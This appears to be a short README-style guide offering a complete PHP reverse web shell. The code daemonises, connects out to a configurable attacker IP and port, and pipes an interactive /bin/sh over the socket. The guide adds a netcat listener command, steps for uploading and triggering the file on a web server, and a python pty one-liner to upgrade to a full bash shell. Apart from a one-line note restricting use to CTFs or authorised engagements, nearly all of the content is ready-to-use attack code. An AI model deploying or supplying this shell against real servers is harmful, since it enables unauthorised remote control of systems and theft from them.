# PHP Reverse Web Shell

Use this reverse shell in CTFs or authorized ethical hacking engagements only.

## Usage
Copy the PHP code block below into new file and save it.

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'YOUR_IP';
$port = PORT;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) { exit(1); }
    if ($pid) { exit(0); }
    if (posix_setsid() == -1) { exit(1); }
    $daemon = 1;
}

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { exit(1); }

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { exit(1); }

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
    if (feof($sock)) break;
    if (feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}


fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
```

Start a netcat listener on any available port.

```bash
nc -lvnp PORT
```

Upload the saved php file to the web server and locate its storage location.

Access the file via `curl` or directly through the browser to establish the connection.

You'll be good to go after that.

If you want to upgrade to a full bash shell and the system has python installed natively run:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

You should now have a full reverse shell established. 
